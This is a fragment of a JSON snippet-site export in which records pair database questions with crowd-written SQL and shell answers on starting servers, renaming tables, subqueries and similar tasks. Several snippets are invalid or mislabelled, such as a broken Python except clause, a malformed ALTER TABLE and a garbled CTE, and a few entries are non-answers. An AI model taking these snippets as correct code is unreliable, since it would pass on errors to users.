    "description": "pip install pysqlite3 \npip install db-sqlite3\npip install sqlite\nimport sqlite3 as lite  import sys    try:      con = lite.connect('products.db')      cur = con.cursor()          cur.execute(\"CREATE TABLE drinks(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      cur.execute(\"CREATE TABLE fruits(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      con.commit()                except e:      if con:          con.rollback()            print(\"Unexpected error %s:\" % e.args[0])      sys.exit(1)  finally:      if con:          con.close()  \n#!/usr/bin/python  import sqlite3  conn = sqlite3.connect('test.db')  print \"Opened database successfully\";\nfrom sqlalchemy import create_engineengine = create_engine('sqlite:///:memory:')dff.to_sql('mySQLtable', con = engine)sqldf = pd.read_sql('mySQLtable', con = engine)sqldf\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4390,
    "keyword": null,
    "link": null,
    "title": " sqlite make primary key",
    "description": "# SQLite -> //if the primary key has only one column, //you use the PRIMARY KEY column constraint  //to define the primary key as follows:       CREATE TABLE table_name(    column_1 INTEGER NOT NULL PRIMARY KEY,    ... );  // in case primary key consists of two or  //more columns, you use the PRIMARY KEY table  //constraint to define the primary as shown in  //the following statement.    CREATE TABLE table_name(      column_1 INTEGER NOT NULL,      column_2 INTEGER NOT NULL,      ...      PRIMARY KEY(column_1,column_2,...)   );\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4391,
    "keyword": null,
    "link": null,
    "title": " sqlite populate database from file command shell",
    "description": "sqlite3 test.db sqlite3> .read create-tables.sql\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4392,
    "keyword": null,
    "link": null,
    "title": " sqlite rename column",
    "description": "ALTER TABLE table_name RENAME TO new_table_name;\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nALTER TABLE my_table TO new_name;\nALTER TABLE existing_table RENAME TO new_table;\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4393,
    "keyword": null,
    "link": null,
    "title": " sqlite rename table",
    "description": "ALTER TABLE table_name RENAME TO new_table_name;\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nALTER TABLE my_table TO new_name;\nALTER TABLE employees   ADD status VARCHAR;\nALTER TABLE existing_table RENAME TO new_table;\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4394,
    "keyword": null,
    "link": null,
    "title": " sqlite reset autoincrement",
    "description": "delete from your_table;     delete from sqlite_sequence where name='your_table';\ndb.delete(\"SQLITE_SEQUENCE\",\"NAME = ?\",new String[]{TABLE_NAME}); /* when deleting or adding rows with AUTOINCREMENT used to reset counter  to biggest primary key in table Author Akhilesh Dhar Dubey */\nUPDATE `sqlite_sequence` SET `seq` = 0 WHERE `name` = 'table_name';\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4395,
    "keyword": null,
    "link": null,
    "title": " sqlite select split string",
    "description": "-- using your data table assuming that b3 is suppose to be b2  WITH split(one, many, str) AS (     SELECT one, '', many||',' FROM data     UNION ALL SELECT one,     substr(str, 0, instr(str, ',')),     substr(str, instr(str, ',')+1)     FROM split WHERE str !='' ) SELECT one, many FROM split WHERE many!='' ORDER BY one;  a|a1 a|a2 a|a3 b|b1 b|b2 c|c2 c|c1\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4396,
    "keyword": null,
    "link": null,
    "title": " sqlite show table definition",
    "description": ".schema table_name\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4397,
    "keyword": null,
    "link": null,
    "title": " sqlite show table indexes",
    "description": "sqlite> .indexes\t\t\t\t\t-- list of all indexes sqlite> .indexes my_table\t\t\t-- indexes of my_table\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4398,
    "keyword": null,
    "link": null,
    "title": " sqlite this.lastID",
    "description": "this.lastId\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4399,
    "keyword": null,
    "link": null,
    "title": " sqlite to csv statement",
    "description": "import pandas as pd  conn = sqlite3.connect(db_file, isolation_level=None,                        detect_types=sqlite3.PARSE_COLNAMES) db_df = pd.read_sql_query(\"SELECT * FROM table\", conn) db_df.to_csv('database.csv', index=False) \n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4400,
    "keyword": null,
    "link": null,
    "title": " sqlite trim",
    "description": "trim(string, character) or  trim(string)\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4401,
    "keyword": null,
    "link": null,
    "title": " sqlite unique",
    "description": "sqlite uniue -------------------------         CREATE TABLE contacts(   contact_id INTEGER PRIMARY KEY,   first_name TEXT,   last_name TEXT,   email TEXT NOT NULL UNIQUE ); \n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4402,
    "keyword": null,
    "link": null,
    "title": " sqlite update from another table",
    "description": "UPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4403,
    "keyword": null,
    "link": null,
    "title": " sqlite version check",
    "description": "select sqlite_version(); \nsqlite> .help .archive ...             Manage SQL archives .auth ON|OFF             Show authorizer callbacks .backup ?DB? FILE        Backup DB (default \"main\") to FILE .bail on|off             Stop after hitting an error.  Default OFF .binary on|off           Turn binary output on or off.  Default OFF .cd DIRECTORY            Change the working directory to DIRECTORY .changes on|off          Show number of rows changed by SQL .check GLOB              Fail if output since .testcase does not match .clone NEWDB             Clone data into NEWDB from the existing database .databases               List names and files of attached databases .dbconfig ?op? ?val?     List or change sqlite3_db_config() options .dbinfo ?DB?             Show status information about the database .dump ?TABLE? ...        Render all database content as SQL .echo on|off             Turn command echo on or off .eqp on|off|full|...     Enable or disable automatic EXPLAIN QUERY PLAN .excel                   Display the output of next command in a spreadsheet .exit ?CODE?             Exit this program with return-code CODE .expert                  EXPERIMENTAL. Suggest indexes for specified queries .fullschema ?--indent?   Show schema and the content of sqlite_stat tables .headers on|off          Turn display of headers on or off .help ?-all? ?PATTERN?   Show help text for PATTERN .import FILE TABLE       Import data from FILE into TABLE .imposter INDEX TABLE    Create imposter table TABLE on index INDEX .indexes ?TABLE?         Show names of indexes .iotrace FILE            Enable I/O diagnostic logging to FILE .limit ?LIMIT? ?VAL?     Display or change the value of an SQLITE_LIMIT .lint OPTIONS            Report potential schema issues. .load FILE ?ENTRY?       Load an extension library .log FILE|off            Turn logging on or off.  FILE can be stderr/stdout .mode MODE ?TABLE?       Set output mode .nullvalue STRING        Use STRING in place of NULL values .once (-e|-x|FILE)       Output for the next SQL command only to FILE .open ?OPTIONS? ?FILE?   Close existing database and reopen FILE .output ?FILE?           Send output to FILE or stdout if FILE is omitted .parameter CMD ...       Manage SQL parameter bindings .print STRING...         Print literal STRING .progress N              Invoke progress handler after every N opcodes .prompt MAIN CONTINUE    Replace the standard prompts .quit                    Exit this program .read FILE               Read input from FILE .restore ?DB? FILE       Restore content of DB (default \"main\") from FILE .save FILE               Write in-memory database into FILE .scanstats on|off        Turn sqlite3_stmt_scanstatus() metrics on or off .schema ?PATTERN?        Show the CREATE statements matching PATTERN .selftest ?OPTIONS?      Run tests defined in the SELFTEST table .separator COL ?ROW?     Change the column and row separators .session ?NAME? CMD ...  Create or control sessions .sha3sum ...             Compute a SHA3 hash of database content .shell CMD ARGS...       Run CMD ARGS... in a system shell .show                    Show the current values for various settings .stats ?on|off?          Show stats or turn stats on or off .system CMD ARGS...      Run CMD ARGS... in a system shell .tables ?TABLE?          List names of tables matching LIKE pattern TABLE .testcase NAME           Begin redirecting output to 'testcase-out.txt' .timeout MS              Try opening locked tables for MS milliseconds .timer on|off            Turn SQL timer on or off .trace ?OPTIONS?         Output each SQL statement as it is run .vfsinfo ?AUX?           Information about the top-level VFS .vfslist                 List all available VFSes .vfsname ?AUX?           Print the name of the VFS stack .width NUM1 NUM2 ...     Set column widths for \"column\" mode sqlite> \n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4404,
    "keyword": null,
    "link": null,
    "title": " sqlite woth cmake",
    "description": "find_package (SQLite3)  include_directories(${SQLite3_INCLUDE_DIRS}) target_link_libraries (${OUT_TARGET} ${SQLite3_LIBRARIES})\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4405,
    "keyword": null,
    "link": null,
    "title": " sqlplus script",
    "description": "sqlplus username/password@service\t-- OR sqlplus / as sysdba  SQL> SELECT sysdate FROM dual;  SQL> @C:\\Users\\folder\\script.sql -- OR  SQL> START C:\\Users\\folder\\script.sql\n",
    "reg_date": "2021-10-12T10:01:04.000Z"
  },
  {
    "id": 4406,
    "keyword": null,
    "link": null,
    "title": " sqlserver: how to search a table used in particular stored procedure",
    "description": "SELECT Name FROM sys.procedures WHERE OBJECT_DEFINITION(OBJECT_ID) LIKE '%TableNameOrWhatever%'\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4407,
    "keyword": null,
    "link": null,
    "title": " sqlserver add column to table",
    "description": "ALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\nALTER TABLE dbo.doc_exa ADD column_b VARCHAR(20) NULL, column_c INT NULL ; \n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4408,
    "keyword": null,
    "link": null,
    "title": " sqlserver create table from select",
    "description": "Select * into new_table  from  old_table  \n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4409,
    "keyword": null,
    "link": null,
    "title": " sqlserver docker",
    "description": "# Run container docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=yourStrong(!)Password' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2017-latest  # Connect to container docker exec -it [id] /opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P \"<YourStrong@Passw0rd>\" \ndocker run -e \"ACCEPT_EULA=Y\" -e \"SA_PASSWORD=yourStrong(!)Password\" -p 1433:1433 -d mcr.microsoft.com/mssql/server:2017-latest\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4410,
    "keyword": null,
    "link": null,
    "title": " sqlsrv default port",
    "description": "1433\nThe default port of SQL server is 1433.\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4411,
    "keyword": null,
    "link": null,
    "title": " sqlstate[imssp]: the active result for the query contains no fields.",
    "description": "with (SELECT afield INTO #temptable FROM atable  WHERE anotherfield = 'somevalue') AS temptable;  SELECT afield,anotherfield,onemorefield FROM atable  where afield NOT IN (SELECT * FROM temptable);\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4412,
    "keyword": null,
    "link": null,
    "title": " sqrt(-1)",
    "description": "Assuming you're doing homework, hang in there! You got this!\nsqrt(-1) returns i\nsqrt(i) = i*sqrt(0.5)+sqrt(0.5)\nYes, both the sin and cos of 45 degrees is 1/sqrt(2)\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4413,
    "keyword": null,
    "link": null,
    "title": " sqrt(880)",
    "description": "wow you too? weird but anyway i need the answer\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4414,
    "keyword": null,
    "link": null,
    "title": " squirrel scientific name",
    "description": "/*squirrel computer scientific name\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4415,
    "keyword": null,
    "link": null,
    "title": " srop database",
    "description": "DROP DATABASE databasename\n",
    "reg_date": "2021-10-12T10:01:05.000Z"
  },
  {
    "id": 4416,
    "keyword": null,
    "link": null,
    "title": " ssh mysql port forwarding",
    "description": "ssh -N -f -L 3336:127.0.0.1:3306 [USER]@[SERVER_IP]  The options used are as follows:  -N - Tells SSH not to execute a remote command. -L 3336:127.0.0.1:3306 - Creates a local port forwarding. The local port (3306), the destination IP (127.0.0.1) and the remote port (3306) are separated with a colon (:). [USER]@[SERVER_IP] - The remote SSH user and server IP address.  To run the command in the background, use the -f option. If the SSH server is listening on a port other than 22 (the default) specify the port with the -p [PORT_NUMBER] option.\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4417,
    "keyword": null,
    "link": null,
    "title": " start mongodb in terminal",
    "description": "sudo systemctl start mongod \nStart a terminal for your mongo server Go to <mongodb-install-directory>/bin directory Run the command./mongod Start a terminal for your mongo shell Go to <mongodb-install-directory>/bin directory Run the command (make sure you put the name of the database)./mongo test\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4418,
    "keyword": null,
    "link": null,
    "title": " start mysql",
    "description": "sudo /etc/init.d/mysql start or  systemctl start mysql.service\nmysql.server start\nmysql-ctl cli\nPress CTRL+C to copy C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld\"\n sudo /usr/local/mysql/support-files/mysql.server start\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4419,
    "keyword": null,
    "link": null,
    "title": " start mysql command line windows",
    "description": "Press CTRL+C to copy C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld\"\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4420,
    "keyword": null,
    "link": null,
    "title": " start mysql server",
    "description": "mysql.server start\nmysql-ctl cli\nPress CTRL+C to copy C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld\"\n sudo /usr/local/mysql/support-files/mysql.server start\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4421,
    "keyword": null,
    "link": null,
    "title": " start mysql server linux terminal",
    "description": "sudo /etc/init.d/mysql start or  systemctl start mysql.service\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4422,
    "keyword": null,
    "link": null,
    "title": " start mysql server mac",
    "description": "brew services stop mysql brew services start mysql brew services restart mysql\nUsing Homebrew: brew install mysql brew tap homebrew/services brew services start mysql mysqladmin -u root password 'secretpaSSw0rd'  Using Docker: docker pull mysql/mysql-server docker run --name=mysql -d mysql/mysql-server\nsudo mysql.server start\nbrew install mysql  sudo chown -R _mysql:mysql /usr/local/var/mysql sudo mysql.server start  sudo mysql // set password for root user, or change root to another user ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password'; FLUSH PRIVILEGES;  exit mysql -u root -p \nalias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \nalias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop'  \n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4423,
    "keyword": null,
    "link": null,
    "title": " start mysql server ubuntu",
    "description": "sudo service mysql start \nsudo /etc/init.d/mysql start or  systemctl start mysql.service\nsudo service mysql-server\nmysql-ctl cli\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4424,
    "keyword": null,
    "link": null,
    "title": " start mysql windows",
    "description": "net start MySQL80 \nPress CTRL+C to copy C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld\"\noption 1: Launch the MySQL Command-Line Client. To launch the client, enter the following command in a Command Prompt window: mysql -u root -p . The -p option is needed only if a root password is defined for MySQL. Enter the password when prompted.   Option 2: Start MySQL Server on Windows  On Windows, you can start the MySQL Server using the mysqld program as follows:  First, open the Run dialog by pressing Windows+R keyboards:  Second, type cmd and press Enter:  Third, type mysqld and press Enter:  mysqld  If the bin folder is not in the Windows path environment, you can navigate to the bin folder e.g., C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\ and use the mysqld command.\n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4425,
    "keyword": null,
    "link": null,
    "title": " start postgres server",
    "description": "sudo service postgresql start\npg_ctl -D /usr/local/var/postgres start \nbrew services start postgresql \npg_ctl -D /usr/local/var/postgres stop \nbrew services stop postgresql \n",
    "reg_date": "2021-10-12T10:01:06.000Z"
  },
  {
    "id": 4426,
    "keyword": null,
    "link": null,
    "title": " start postgresql ubuntu",
    "description": "sudo service postgresql start # To start the postgresql service\nsudo service postgresql start\nsudo apt install postgresql postgresql-contrib \nsudo service postgresql-9.3 start\nsudo service postgresql-9.3 initdb sudo service postgresql-9.3 start\nsudo service postgresql-9.3 initdb\n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4427,
    "keyword": null,
    "link": null,
    "title": " start stop mysql linux",
    "description": "service mysql start service mysql stop service mysql restart \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4428,
    "keyword": null,
    "link": null,
    "title": " starting mysql service from mac",
    "description": "sudo /usr/local/mysql/support-files/mysql.server start  sudo /usr/local/mysql/support-files/mysql.server stop \nalias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4429,
    "keyword": null,
    "link": null,
    "title": " stop and start mysql",
    "description": "sudo service mysql stop sudo service mysql start \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4430,
    "keyword": null,
    "link": null,
    "title": " stop mysql server mac",
    "description": "brew services stop mysql brew services start mysql brew services restart mysql\nsudo mysql.server start\n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4431,
    "keyword": null,
    "link": null,
    "title": " stop mysql service ubuntu",
    "description": "service mysqld status service mysqld stop service mysqld start  \nsudo service mysql-server\nsudo /etc/init.d/mysql stop \nsudo stop mysql # The service must be running \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4432,
    "keyword": null,
    "link": null,
    "title": " stop mysql ubuntu",
    "description": "service mysqld status service mysqld stop service mysqld start  \nsudo service mysql-server\nsudo /etc/init.d/mysql stop \nsudo stop mysql # The service must be running \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4433,
    "keyword": null,
    "link": null,
    "title": " stop mysql windows",
    "description": "net stop MySQL80  \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4434,
    "keyword": null,
    "link": null,
    "title": " stop psql server windows",
    "description": "pg_ctl -D \"C:\\Program Files\\PostgreSQL\\9.6\\data\" stop \n",
    "reg_date": "2021-10-12T10:01:07.000Z"
  },
  {
    "id": 4435,
    "keyword": null,
    "link": null,
    "title": " store select query result in variable sql server",
    "description": "DECLARE @result1 TABLE (a INT, b INT, c INT)  INSERT INTO @result1 SELECT a, b, c FROM table1  SELECT a AS val FROM @result1 UNION SELECT b AS val FROM @result1 UNION SELECT c AS val FROM @result1 \n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4436,
    "keyword": null,
    "link": null,
    "title": " stored procedure with parameters mysql",
    "description": "-- Stored Procedure with parameters with default -- this examble return all clients in all states if parameter is NULL  DELIMITER $$  CREATE PROCEDURE get_clients_by_state ( \tstate CHAR(2) ) BEGIN \tSELECT  \t\t* \tFROM \t\tclients c     WHERE c.state =  IFNULL(state, c.state); END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL get_client_by_state(NULL);\n-- Stored Procedure with parameters with default  DELIMITER $$  CREATE PROCEDURE get_clients_by_state ( \tstate CHAR(2) ) BEGIN \tIF state IS NULL THEN     \tSET state = 'CA';     END IF;  \tSELECT  \t\t* \tFROM \t\tclients c     WHERE c.state =  state; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL get_client_by_state(NULL);\n-- Stored Procedure with parameters  DELIMITER $$  CREATE PROCEDURE get_clients_by_state ( \tstate CHAR(2) ) BEGIN \tSELECT  \t\t* \tFROM \t\tclients c     WHERE c.state =  state; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL get_client_by_state('CA'); \n                                     DELIMITER //  CREATE PROCEDURE GetOfficeByCountry( \tIN countryName VARCHAR(255) ) BEGIN \tSELECT *   \tFROM offices \tWHERE country = countryName; END //  DELIMITER ;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4437,
    "keyword": null,
    "link": null,
    "title": " storing timezones in postgres",
    "description": "SET TIME ZONE 'Europe/Moscow';\nselect name from pg_timezone_names where name not like 'posix%' and name not ilike 'system%' order by name;\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4438,
    "keyword": null,
    "link": null,
    "title": " stpop start psql server",
    "description": "sudo service postgresql start sudo service postgresql stop sudo service postgresql restart\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4439,
    "keyword": null,
    "link": null,
    "title": " str to date sql server",
    "description": "   SELECT STR_TO_DATE('17-09-2010','%d-%m-%Y');\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4440,
    "keyword": null,
    "link": null,
    "title": " strict mode in mysql",
    "description": "SHOW VARIABLES LIKE 'sql_mode';\t\t-- enabled if STRICT_TRANS_TABLES is present SET GLOBAL sql_mode='';\t\t\t\t\t\t\t-- disables strict mode SET GLOBAL sql_mode='STRICT_TRANS_TABLES';\t\t-- enables strict mode\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4441,
    "keyword": null,
    "link": null,
    "title": " string concatenation sql server",
    "description": "SELECT 'Comments: ' + CAST(9 AS varchar(12)) AS Result;\nWe use \"||\" to concatenation in Sql  example: WHERE LOWER(FIRST_NAME || LAST_NAME)  LIKE '%d%' ; \nSELECT CONCAT('Comments: ' , CAST(9 AS varchar(12))) AS Result;\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4442,
    "keyword": null,
    "link": null,
    "title": " string length sql postgresql",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n",
    "reg_date": "2021-10-12T10:01:08.000Z"
  },
  {
    "id": 4443,
    "keyword": null,
    "link": null,
    "title": " string to int mysql",
    "description": "SELECT field,CONVERT(field,UNSIGNED INTEGER) AS num FROM table;\nSELECT CAST(PROD_CODE AS INT) FROM PRODUCT\nSELECT CAST(aField as UNSIGNED) from table;  -- for VARCHAR use CHAR(50), INT use UNSIGNED\n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4444,
    "keyword": null,
    "link": null,
    "title": " strreplace mysql",
    "description": "REPLACE(str, find_string, replace_with) \n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4445,
    "keyword": null,
    "link": null,
    "title": " stuff and replace in sql",
    "description": "##sql query with replace function #syntax UPDATE tableName SET  column_name = REPLACE(column_name, 'fromStringValue', 'toStringValue');  #Example  Update  tbl_employee Set designation = REPLACE(designation, 'SEO', 'Developer');\nUPDATE tableName  SET  fieldName = REPLACE(fieldName, 'fromStringValue', 'toStringValue');\nSTUFF Function: This function is used to overwrite existing character or inserts a string into another string.   REPLACE function: This function is used  to replace the existing characters of all the occurrences.\n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4446,
    "keyword": null,
    "link": null,
    "title": " stuff in sql",
    "description": "STUFF Function: This function is used to overwrite existing character or inserts a string into another string.   REPLACE function: This function is used  to replace the existing characters of all the occurrences.\n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4447,
    "keyword": null,
    "link": null,
    "title": " su: Authentication failure mysql",
    "description": "sudo service mysql start\n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4448,
    "keyword": null,
    "link": null,
    "title": " sub query in linq",
    "description": "var result = from ord in db.Orders              join osub in (from o in db.Orders \t\t            where o.region = \"Canada\" \t\t            select o)                 on ord.orderId equals osub.orderId  \t      select new {ord.custId, ord.orderDate};\n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4449,
    "keyword": null,
    "link": null,
    "title": " subquery sql",
    "description": "USE AdventureWorks2016; GO SELECT Ord.SalesOrderID, Ord.OrderDate,     (SELECT MAX(OrdDet.UnitPrice)      FROM Sales.SalesOrderDetail AS OrdDet      WHERE Ord.SalesOrderID = OrdDet.SalesOrderID) AS MaxUnitPrice FROM Sales.SalesOrderHeader AS Ord; GO\nWe use subquery in order to get aggregate value in column without grouping data\nSUBQUERY IS NESTED QUERY INSIDE A SELECT,  INSERT OR UPDATE METHODS. OR INSIDE ANOTHER SUBQUERY \nUPDATE Book SET note= 'editore: ' + (SELECT name FROM Publisher WHERE Publisher.ID = Book.publisher)\nUPDATE dataflair_emp1  SET salary=35000 WHERE emp_id  = ( SELECT emp_id                     FROM dataflair_emp1                     WHERE post='Sr.Manager');      select * from dataflair_emp1; \nSELECT column_name  FROM table_name1 WHERE VALUE IN  (SELECT column_name FROM table_name2  WHERE condition) \n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4450,
    "keyword": null,
    "link": null,
    "title": " substring mysql",
    "description": "mysql> SELECT SUBSTRING('Quadratically',5);         -> 'ratically' mysql> SELECT SUBSTRING('foobarbar' FROM 4);         -> 'barbar' mysql> SELECT SUBSTRING('Quadratically',5,6);         -> 'ratica' mysql> SELECT SUBSTRING('Sakila', -3);         -> 'ila' mysql> SELECT SUBSTRING('Sakila', -5, 3);         -> 'aki' mysql> SELECT SUBSTRING('Sakila' FROM -4 FOR 2);         -> 'ki'\nmysql> SELECT SUBSTRING('w3resource',4,3); +-----------------------------+ | SUBSTRING('w3resource',4,3) | +-----------------------------+ | eso                         |  +-----------------------------+ 1 row in set (0.00 sec) \n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4451,
    "keyword": null,
    "link": null,
    "title": " sum mysql column",
    "description": "SELECT sum( mark ) FROM `student`\n",
    "reg_date": "2021-10-12T10:01:09.000Z"
  },
  {
    "id": 4452,
    "keyword": null,
    "link": null,
    "title": " sum of multiple columns in postgres",
    "description": "SELECT     Val1,    Val2,    Val3,    sum(Val1 + Val2 + Val3) as 'Total' FROM Emp\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4453,
    "keyword": null,
    "link": null,
    "title": " sum sqlserver",
    "description": "SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails;\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4454,
    "keyword": null,
    "link": null,
    "title": " sum with group by in sql server",
    "description": "SELECT cust_city, SUM (opening_amt + receive_amt)  FROM customer  GROUP BY cust_city; \n// Use SQL Group By clause after the Where clause // Any column in the select list must either be in the Group By clause  // or part of an agregation statement, like the Sum() statement // Multiple columns can be included in the Group By Clause seperated by a comma // Multiple columns stipulate the order tree. Order by  // first column, then second ... etc  Select LastName, FirstName, Sum(LeaveDays), Max(age) From EmployeeProjects Where StartDate > '2020-01-01' Group By LastName, FirstName\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4455,
    "keyword": null,
    "link": null,
    "title": " supprimer les valeur d'une table mysql",
    "description": "SET FOREIGN_KEY_CHECKS=0; TRUNCATE `membres`; SET FOREIGN_KEY_CHECKS=1; \n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4456,
    "keyword": null,
    "link": null,
    "title": " switch case sql column",
    "description": "SELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n-- Case Eg.) to retrive the MAX value of a Field  -- if there are entries for the Field in table MAX value will be returned  -- But if there is no entries at all for the Field in tabel MAX will return -- Null as the output. But Using Case When we can check it out return zero  -- or any other value if there is no enties for the Field in table.. SELECT  CASE   -- Like Switch Case \tWHEN -- First When condition  \t\t(MAX(BILLID) IS NULL) -- Condition  \tTHEN 1   -- output   (We can also add more When conditions like Above) ELSE -- When WHEN Condition not Satisfied Below will be Executed.  \t\t(MAX(BILLID)) -- output END  as MAXBILLID   from  DUAL; -- Final Output -- If there is no entry in the Field for the table -- BILLID --  1 -- If there are entries MAX of that Field value from the table -- BILLID -- 10\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4457,
    "keyword": null,
    "link": null,
    "title": " switch case sql server",
